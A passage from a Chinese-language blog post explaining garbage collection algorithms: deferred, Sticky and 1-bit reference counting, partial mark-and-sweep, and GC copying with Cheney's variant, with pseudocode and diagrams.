class="line"> <span class="keyword">if</span>(obj == <span class="literal">NULL</span>)</span><br><span class="line"> <span class="built_in">allocation_fail</span>()</span><br><span class="line"> obj.ref_cnt = <span class="number">1</span></span><br><span class="line"> <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// scan_zct：清空ZST表。首先将根引用的对象加一（为了使计数器正常体现对象的引用计数）。此时判断ZST表的所有对象的引用计数，如果对象计数器为0则将其释放并移出ZST。如果大于0则代表该对象为活动对象，只将其移出ZST。</span></span><br><span class="line"><span class="built_in">scan_zct</span>()&#123;</span><br><span class="line"> <span class="keyword">for</span>(r : $roots)</span><br><span class="line"> (*r).ref_cnt++</span><br><span class="line"> <span class="keyword">for</span>(obj : $zct)</span><br><span class="line">     <span class="built_in">remove</span>($zct, obj)<span class="comment">// 不管obj.ref_cnt是否为0都将其移出ZST。</span></span><br><span class="line"> <span class="keyword">if</span>(obj.ref_cnt == <span class="number">0</span>)</span><br><span class="line"> <span class="built_in"><span class="keyword">delete</span></span>(obj)</span><br><span class="line"> <span class="keyword">for</span>(r : $roots)</span><br><span class="line"> (*r).ref_cnt--</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// delete：递归处理该对象的子对象的引用计数，并将该对象挂在空闲队列上。</span></span><br><span class="line"><span class="built_in"><span class="keyword">delete</span></span>(obj)&#123;</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj)</span><br><span class="line"> (*child).ref_cnt--</span><br><span class="line"> <span class="keyword">if</span>((*child).ref_cnt == <span class="number">0</span>)</span><br><span class="line"> <span class="built_in"><span class="keyword">delete</span></span>(*child)</span><br><span class="line"> <span class="built_in">reclaim</span>(obj)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>【优点】延迟了根引用的计数，减轻了因根引用对计数器增减造成的负担。</p><p>【缺点】为了延迟计数器值的增减，势必造成垃圾不能马上得到回收。导致最大暂停时间延长。</p><h5 id="Sticky引用计数法"><a href="#Sticky引用计数法" class="headerlink" title="Sticky引用计数法"></a>Sticky引用计数法</h5><p>该方式解决的是<code>计数器需要占用很多位</code>的问题。核心在于减少计数器的位宽。但减少位宽可能会出现数值溢出的现象。针对计数器溢出的问题，主要有两种方法来处理这个问题。</p><ol><li><p><code>do nothing</code>：不再处理该计数器溢出的对象。某对象计数器溢出正说明该对象较为重要，不易变为垃圾而被回收。</p></li><li><p><code>使用GC标记-清除算法进行管理</code>：可以使用GC 标记 - 清除算法来充当引用计数法的后援。大致思路就是将计时器全部清零（目的是为了模拟GC 标记 - 清除算法中的标记位），之后还是像GC 标记 - 清除算法一样，将活动对象的计数器+1，也就是让他非0，之后遍历整个堆回收非活动对象。</p><p>这里的的 GC 标记 - 清除算法和之前的 GC 标记 - 清除算法主要有以下 3 点不同。</p><blockquote><ol><li> 一开始就把所有对象的计数器值设为 0</li><li> 不标记对象，而是对计数器进行增量操作</li><li> 为了对计数器进行增量操作，算法对活动对象进行了不止一次的搜索</li></ol></blockquote><p>【优点】即使对象在计数器溢出后成了垃圾，程序还是能回收它。</p><p>【优点】可以回收循环的垃圾。</p><p>【缺点】吞吐量会降低：一是因为需要重置所有对象的计数器。二是由于这里的的 GC 标记 - 清除算法是进行计数器的增量，此时对象的索引也需要消耗一定的时间。</p></li></ol><h5 id="1位引用计数法（1bit-Reference-Counting）"><a href="#1位引用计数法（1bit-Reference-Counting）" class="headerlink" title="1位引用计数法（1bit Reference Counting）"></a><strong>1</strong>位引用计数法（1bit Reference Counting）</h5><p>1 位引用计数法解决的仍然是<code>计数器需要占用很多位</code>的问题。基于“一般的对象都很难被共有”的理论，可以得出一般的对象引用计数都为1。考虑到这一点，我们用 1 位来表示某个对象的被引用数是 1 个还是多个（即用 0 表示被引用数为 1， 1 表示被引用数&gt;= 2，我们分别称以上 2 种状态为 UNIQUE 和 MULTIPLE），这样也能达到目的。</p><p>1 位引用计数法比较特殊的一点在于它使用指针来存放引用计数（正常引用计数法使用对象来存放，这里凭借四字节对齐最后两位不能利用的性质，可以将这个引用计数，也可以叫做flag放入指针来达到目的），这样当更新指针时只要将指针复制即可。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210928162537983.png" alt="image-20210928162537983"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210928162619036.png" alt="image-20210928162619036"></p><p>这里更新了之前由 A 引用 D 的指针，让其引用 C。这也可以看成是把由 B 到 C 的指针复制到 A 了。通过这项操作，两个指向 C 的指针都变成了 MULTIPLE 指针。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 上图的 A 的指针就是dest_ptr，B 的指针就是被复制的src_ptr。经过复制，两个指针都会set_multiple_tag，也就是都变成了 MULTIPLE 指针。</span></span><br><span class="line"><span class="built_in">copy_ptr</span>(dest_ptr, src_ptr)&#123;</span><br><span class="line"> <span class="built_in">delete_ptr</span>(dest_ptr)</span><br><span class="line"> *dest_ptr = *src_ptr</span><br><span class="line"> <span class="built_in">set_multiple_tag</span>(dest_ptr)</span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">tag</span>(src_ptr) == UNIQUE)</span><br><span class="line"> <span class="built_in">set_multiple_tag</span>(src_ptr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个函数超级简单。只有当指针 ptr 的标签是 UNIQUE 时，它才会回收根据这个指针所引用的对象。因为当标签是 MULTIPLE 时，还可能存在其他引用这个对象的指针，所以它无法回收对象。</span></span><br><span class="line"><span class="built_in">delete_ptr</span>(ptr)&#123;</span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">tag</span>(ptr) == UNIQUE)</span><br><span class="line"> <span class="built_in">reclaim</span>(*ptr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>【优点】<code>不容易出现高速缓存缺失</code>：缓存作为一块存储空间，比内存的读取速度要快得多。如果要读取的数据就在缓存里的话，计算机就能进行高速处理；但如果需要的数据不在缓存里（即高速缓存缺失）的话，就需要读取内存，比较浪费时间。当某个对象 A 要引用在内存中离它很远的对象 B 时，以往的引用计数法会在增减计数器值的时候读取 B，从而导致高速缓存缺失。但由于1 位引用计数法不需要在更新计数器（或者说是标签）的时候读取要引用的对象，只是指针的复制过程，所以可以减少出现这种问题。</p><p>【优点】<code>节省内存</code>：毕竟只占用1位。</p><p>【缺点】<code>无法处理计数器溢出的对象</code>：和 Sticky 引用计数法一样，这个可能需要其他方式（比如GC标记-清除算法）辅助操作。</p><h5 id="部分标记-清除算法（Partial-Mark-amp-Sweep）"><a href="#部分标记-清除算法（Partial-Mark-amp-Sweep）" class="headerlink" title="部分标记-清除算法（Partial Mark &amp; Sweep）"></a>部分标记-清除算法（Partial Mark &amp; Sweep）</h5><p>首先提一句，这个算法看起来比较麻烦，但是原理还是很容易懂的，无非就是利用了一个队列存放可疑对象之后对可疑对象进行操作的过程。</p><p>上面用来兜底的GC 标记 - 清除算法由于以全部堆为对象导致效率很低。产生了很多无用的搜索。因此我们可以只对“可能有循环引用的对象群”使用 GC 标记 - 清除算法，对其他对象进行内存管理时使用引用计数法。像这样只对一部分对象群使用 GC 标记 -清除算法的方法，叫作“部分标记 - 清除算法”。</p><p><strong>说白了，这个算法的目的就是为了找到循环引用的对象群并进行处理。</strong></p><p>在部分标记 - 清除算法中，对象会被涂成 4 种不同的颜色来进行管理。每个颜色的含义如下：</p><blockquote><ol><li> 黑（BLACK）：绝对不是垃圾的对象（对象产生时的初始颜色）</li><li> 白（WHITE）：绝对是垃圾的对象</li><li> 灰（GRAY）：搜索完毕的对象</li><li> 阴影（HATCH）：可能是循环垃圾的对象。</li></ol></blockquote><p>具体实施方式是往头中分配 2 位空间，然后用00～11 的值对应这 4 个颜色，以示区分。这里用 obj.color 来表示对象 obj 的颜色。obj.color 取 BLACK、WHITE、GRAY、HATCH 中的任意一个值。</p><p>下面是具体步骤，以一个具体的例子进行描述</p><h6 id="1、初始状态"><a href="#1、初始状态" class="headerlink" title="1、初始状态"></a>1、初始状态</h6><p>有循环引用的对象群是 ABC 和 DE，其中 A 和 D 由根引用。此外，这里由 C 和 E 引用 F。所有对象的颜色都还是初始状态下的黑色。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918135504458.png" alt="image-20210918135504458"></p><h6 id="2、dec-ref-cnt"><a href="#2、dec-ref-cnt" class="headerlink" title="2、dec_ref_cnt"></a>2、dec_ref_cnt</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dec_ref_cnt：在进行减引用的操作时，如果该对象的引用计数不为0，将其颜色涂成阴影，并放入一个专门存放阴影对象的队列中。</span></span><br><span class="line"><span class="built_in">dec_ref_cnt</span>(obj)&#123;</span><br><span class="line"> obj.ref_cnt--</span><br><span class="line"> <span class="keyword">if</span>(obj.ref_cnt == <span class="number">0</span>)</span><br><span class="line"> <span class="built_in"><span class="keyword">delete</span></span>(obj)</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span>(obj.color != HATCH)</span><br><span class="line"> obj.color = HATCH</span><br><span class="line"> <span class="built_in">enqueue</span>(obj, $hatch_queue)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这步操作后堆状态如下。由根到 A 的引用被删除了，指向 A 的指针被追加到了队列（$hatch_queue）之中。此外，A 被涂上了阴影。这个队列的存在是为了连接那些可能是循环引用的一部分的对象。被连接到队列的对象会被作为 GC 标记 - 清除算法的对象，使得循环引用的垃圾被回收。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918140036603.png" alt="image-20210918140036603"></p><h6 id="3、new-obj-amp-scan-hatch-queue"><a href="#3、new-obj-amp-scan-hatch-queue" class="headerlink" title="3、new_obj &amp; scan_hatch_queue"></a>3、new_obj &amp; scan_hatch_queue</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// new_obj：当可以分配时，对象就会被初始化成黑色。当分配无法顺利进行的时候，程序会通过 scan_hatch_queue() 函数搜索阴影队列去尝试回收垃圾。scan_hatch_queue() 函数执行完毕后，程序会递归地调用 new_obj() 函数再次尝试分配。</span></span><br><span class="line"><span class="built_in">new_obj</span>(size)&#123;</span><br><span class="line"> obj = <span class="built_in">pickup_chunk</span>(size)</span><br><span class="line"> <span class="keyword">if</span>(obj != <span class="literal">NULL</span>)</span><br><span class="line"> obj.color = BLACK</span><br><span class="line"> obj.ref_cnt = <span class="number">1</span></span><br><span class="line"> <span class="keyword">return</span> obj</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">is_empty</span>($hatch_queue) == FALSE)</span><br><span class="line"> <span class="built_in">scan_hatch_queue</span>()</span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">new_obj</span>(size)</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> <span class="built_in">allocation_fail</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// scan_hatch_queue：如果取出的对象 obj 被涂上了阴影，程序就会将 obj 作为参数，依次调用 paint_gray、scan_gray和 collect_white 函数从而通过这些函数找出循环引用的垃圾，将其回收。当 obj 没有被涂上阴影时，就意味着 obj 没有可能形成循环引用。此时程序将再次调用 scan_hatch_queue函数进行下一个阴影对象的操作。</span></span><br><span class="line"><span class="built_in">scan_hatch_queue</span>()&#123;</span><br><span class="line"> obj = <span class="built_in">dequeue</span>($hatch_queue)</span><br><span class="line"> <span class="keyword">if</span>(obj.color == HATCH)</span><br><span class="line"> <span class="built_in">paint_gray</span>(obj)</span><br><span class="line"> <span class="built_in">scan_gray</span>(obj)</span><br><span class="line"> <span class="built_in">collect_white</span>(obj)</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">is_empty</span>($hatch_queue) == FALSE)</span><br><span class="line"> <span class="built_in">scan_hatch_queue</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="4、paint-gray"><a href="#4、paint-gray" class="headerlink" title="4、paint_gray"></a>4、paint_gray</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// paint_gray：将选中的阴影对象及子对象（子对象颜色需为黑或阴影）涂灰，并将所有对象的子对象的引用计数减一，</span></span><br><span class="line"><span class="built_in">paint_gray</span>(obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(obj.color == (BLACK | HATCH))</span><br><span class="line"> obj.color = GRAY</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj))</span><br><span class="line"> (*child).ref_cnt--</span><br><span class="line"> <span class="built_in">paint_gray</span>(*child)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行完成后大概如下图</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918142421368.png" alt="image-20210918142421368"></p><p>执行过程如下图</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918142502685.png" alt="image-20210918142502685"></p><p>首先，在 (a) 中 A 被涂成了灰色。虽然程序对计数器执行了减量操作，但并不是对 A，而是对 B 的计数器进行了减量操作。下面在 (b) 中 B 也被涂成了灰色，不过这时程序并没有对 B 进行减量操作，而是对 C 进行了减量操作。在 (c) 中 C 被涂成灰色时，程序对 A 和 F 的计数器进行了减量操作。这样一来，A、B、C 的循环垃圾的计数器值都变成了 0。(d) 是 A、B、C、F 各个对象搜索结束后的样子。</p><p>部分标记 - 清除算法的特征就是要涂色的对象和要进行计数器减量的对象不是同一对象，据此就可以很顺利地回收循环垃圾。这样做的原因是为了明确这个阴影对象是否在环内，证明如下：</p><p>假如原始图如下</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918142915296.png" alt="image-20210918142915296"></p><p>当要涂色的对象和要进行计数器减一的对象为同一对象时，过程如下</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918143007263.png" alt="image-20210918143007263"></p><p>这样我们并不能通过A的引用计数直接确定该对象是否在环中。因为无论A是否成环，它的引用计数一直为0，所以无法对是否成环进行区分。而当我们计数器减一的对象在涂色对象之后时，我们可以很容易通过A的计数判断它是否是一个独立的环。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918143229160.png" alt="image-20210918143229160"></p><p>当搜索完 C 时对象 A 的计数器值为 1，所以 A 不能被回收。所以很明显这个并不是一个独立的环。在这之后，paint_black() 函数会把对象 A 到 C 全部涂黑，也会对 B 和 C 的计数器进行增量操作，这样对象就完全回到了原始的状态。</p><h6 id="5、scan-gray"><a href="#5、scan-gray" class="headerlink" title="5、scan_gray"></a>5、scan_gray</h6><p>执行完 paint_gray() 函数以后，下一个要执行的就是 scan_gray() 函数。它会搜索灰色对象，把计数器值为 0 的对象涂成白色。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// scan_gray：这个函数作用是为了操作灰色对象，如果灰色对象的引用计数为0则将其涂白，否则将其涂黑。</span></span><br><span class="line"><span class="built_in">scan_gray</span>(obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(obj.color == GRAY)</span><br><span class="line"> <span class="keyword">if</span>(obj.ref_cnt &gt; <span class="number">0</span>)</span><br><span class="line"> <span class="built_in">paint_black</span>(obj)</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> obj.color = WHITE</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj))</span><br><span class="line"> <span class="built_in">scan_gray</span>(*child)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// paint_black：在涂黑的过程中也会将引用计数恢复，因为涂灰操作将引用计数减一了。</span></span><br><span class="line"><span class="built_in">paint_black</span>(obj)&#123;</span><br><span class="line"> obj.color = BLACK</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj))</span><br><span class="line"> (*child).ref_cnt++</span><br><span class="line"> <span class="keyword">if</span>((*child).color != BLACK)</span><br><span class="line"> <span class="built_in">paint_black</span>(*child)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时现场如下，不难看出，形成了循环垃圾的对象 A、B、C 被涂成了白色，而有循环引用的非垃圾对象 D、E、F 被涂成了黑色。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918143831904.png" alt="image-20210918143831904"></p><h6 id="6、collect-white"><a href="#6、collect-white" class="headerlink" title="6、collect_white"></a>6、collect_white</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// collect_white，这个函数很简单，就是为了回收白色对象。但是这里我并不明白为什么还要把obj涂黑。</span></span><br><span class="line"><span class="built_in">collect_white</span>(obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(obj.color == WHITE)</span><br><span class="line"> obj.color = BLACK</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj))</span><br><span class="line"> <span class="built_in">collect_white</span>(*child)</span><br><span class="line"> <span class="built_in">reclaim</span>(obj)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回收独立环后的对象如下。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918144147141.png" alt="image-20210918144147141"></p><p>到这步已经完成了整个回收独立环的操作，大体步骤就是先将可疑对象挑出，然后遍历可疑对象挨个判断，判断方式为将子对象的引用计数减一，如果成环则环内的引用计数都会互相减为0，最终自身也会被减为0，也就是对象自己发起操作后又反馈改变了自身，这样就判断了环是否存在，之后就是回收环内对象的过程。而这个阴影队列的作用就在于假如这个阴影对象真的在环中我们无法找到他，就可以通过队列存放的指针指向这块空间。</p><p>【优点】<code>吞吐量</code>：聚焦于成环对象的搜索与清除，减少了其他无需索引对象的索引成本。</p><p>【缺点】<code>吞吐量</code>：还是吞吐量的问题，对队列中的候选垃圾处理较复杂。由于该算法对队列中每个对象进行了三次操作（mark_gray，scan_gray和collect_white），增加了内存管理所花费的时间。</p><p>【缺点】<code>最大暂停时间增加</code>：势必增加最大暂停时间的长度，毕竟会对队列对象进行操作。</p><h3 id="GC复制算法（Copying-GC）"><a href="#GC复制算法（Copying-GC）" class="headerlink" title="GC复制算法（Copying GC）"></a>GC复制算法（Copying GC）</h3><h4 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h4><p>GC复制算法需要两块同样大小的空间，分别称为From空间和To空间。通过将From 空间的活动对象复制到To空间，再对From 空间和 To 空间互换来实现GC，此时新的From空间是一块干净的空间。（Marvin L. Minsky 1963发布）</p><h4 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// copying：将活动的对象从From空间copy进To空间，再对From 空间和 To 空间互换</span></span><br><span class="line"><span class="built_in">copying</span>()&#123;</span><br><span class="line"> $free = $to_start</span><br><span class="line"> <span class="keyword">for</span>(r : $roots)</span><br><span class="line"> *r = <span class="built_in">copy</span>(*r)</span><br><span class="line"> <span class="built_in">swap</span>($from_start, $to_start)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// copy：复制给定的活动对象并递归copy该对象的子对象</span></span><br><span class="line"><span class="built_in">copy</span>(obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(obj.tag != COPIED)</span><br><span class="line"> <span class="built_in">copy_data</span>($free, obj, obj.size)</span><br><span class="line"> obj.tag = COPIED</span><br><span class="line"> obj.forwarding = $free</span><br><span class="line"> $free += obj.size</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj.forwarding))</span><br><span class="line"> *child = <span class="built_in">copy</span>(*child)</span><br><span class="line"> <span class="keyword">return</span> obj.forwarding</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  GC 完成后只有 1 个chunk的内存空间。在每次分配时，只要把所申请大小的内存空间从这个chunk中分割出来给 mutator 就行了。也就是说，这里的分配跟 GC 标记 - 清除算法中的分配不同，不需要遍历空闲链表。</span></span><br><span class="line"><span class="built_in">new_obj</span>(size)&#123;</span><br><span class="line"> <span class="keyword">if</span>($free + size &gt; $from_start + HEAP_SIZE/<span class="number">2</span>)</span><br><span class="line"> <span class="built_in">copying</span>()</span><br><span class="line"> <span class="keyword">if</span>($free + size &gt; $from_start + HEAP_SIZE/<span class="number">2</span>)</span><br><span class="line"> <span class="built_in">allocation_fail</span>()</span><br><span class="line"> obj = $free</span><br><span class="line"> obj.size = size</span><br><span class="line"> $free += size</span><br><span class="line"> <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行过程如下图，通过深搜的方式将根执行的活动对象依次由From空间拷贝到To空间。这里对号表示已经复制完成，对号后面的 B<em>Ꞌ</em> 表示的是forwarding指针，指向To空间。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918175308355.png" alt="image-20210918175308355"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918175957822.png" alt="image-20210918175957822"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918180037270.png" alt="image-20210918180037270"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918180056029.png" alt="image-20210918180056029"></p><h4 id="评估-2"><a href="#评估-2" class="headerlink" title="评估"></a>评估</h4><h5 id="优点-2"><a href="#优点-2" class="headerlink" title="优点"></a>优点</h5><ol><li><code>优秀的吞吐量</code>：由于只需要遍历活动对象并清除整个堆的时间，所以它可以在较短时间内完成GC。</li><li><code>可实现高速分配</code>：GC 复制算法不使用空闲链表。这是因为空闲chunk是一个连续的内存空间。通过移动 $free 指针来分配内存。</li><li><code>不会发生碎片化</code>：由于GC复制算法具有“压缩”（把对象重新集中，放在堆的一端的行为）的性质，分配空间直接移动$free指针，就算$free前面的内存被释放了，GC之后又可以将活动对象“压缩”。</li><li><code>与缓存兼容</code>：在 GC 复制算法中有引用关系的对象会被安排在堆里离彼此较近的位置。这可以使 mutator 执行速度加快。</li></ol><h5 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h5><ol><li><code>堆使用效率低</code>：GC 复制算法把堆二等分，只能利用其中的一半来安排对象，浪费空间。</li><li><code>不兼容保守式GC算法</code>：GC 复制算法必须移动对象重写指针，而保守式GC的性质决定了它不允许移动对象。</li><li><code>递归调用函数</code>：复制某个对象时要递归复制它的子对象。因此带来额外的处理负担。相比起递归算法，迭代算法能更高速地执行 。</li></ol><h4 id="优化措施-2"><a href="#优化措施-2" class="headerlink" title="优化措施"></a>优化措施</h4><h5 id="Cheney的GC复制算法"><a href="#Cheney的GC复制算法" class="headerlink" title="Cheney的GC复制算法"></a><strong>Cheney</strong>的<strong>GC</strong>复制算法</h5><p>解决的是<code>递归调用函数</code>的问题。核心在于使用迭代方式遍历复制，但是使用了广搜的方式，但是没有充分利用缓存的便利——有引用关系的对象不相邻。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将 scan 和 $free 的两个指针初始化。scan 是用于搜索复制完成的对象的指针。$free 是指向chunk开头的指针，</span></span><br><span class="line"><span class="built_in">copying</span>()&#123;</span><br><span class="line"> scan = $free = $to_start</span><br><span class="line"> <span class="keyword">for</span>(r : $roots)</span><br><span class="line"> *r = <span class="built_in">copy</span>(*r)</span><br><span class="line"> <span class="keyword">while</span>(scan != $free)</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(scan))</span><br><span class="line"> *child = <span class="built_in">copy</span>(*child)</span><br><span class="line"> scan += scan.size</span><br><span class="line"> <span class="built_in">swap</span>($from_start, $to_start)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断forwarding指针指向哪块空间来判断是否复制完成，因为复制完成的话该指针指向的是To空间</span></span><br><span class="line"><span class="built_in">copy</span>(obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">is_pointer_to_heap</span>(obj.forwarding, $to_start) == FALSE)</span><br><span class="line"> <span class="built_in">copy_data</span>($free, obj, obj.size)</span><br><span class="line"> obj.forwarding = $free</span><br><span class="line"> $free += obj.size</span><br><span class="line"> <span class="keyword">return</span> obj.forwarding</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用了$scan 和 $free。首先复制所有从根直接引用的对象，在这里就是复制 B 和 G。$scan指向当前正在搜索的对象，$free指向空闲chunk的开头。复制的过程中$scan与 $free一般中间会有一部分对象，我们知道这些对象都是活动对象，并按照先入先出（FIFO）的方式进行操作（这样把堆兼用作队列正是 Cheney 算法的一大优点，不用特意为队列留出多余的内存空间就能进行搜索。）。最后复制完成后$scan与 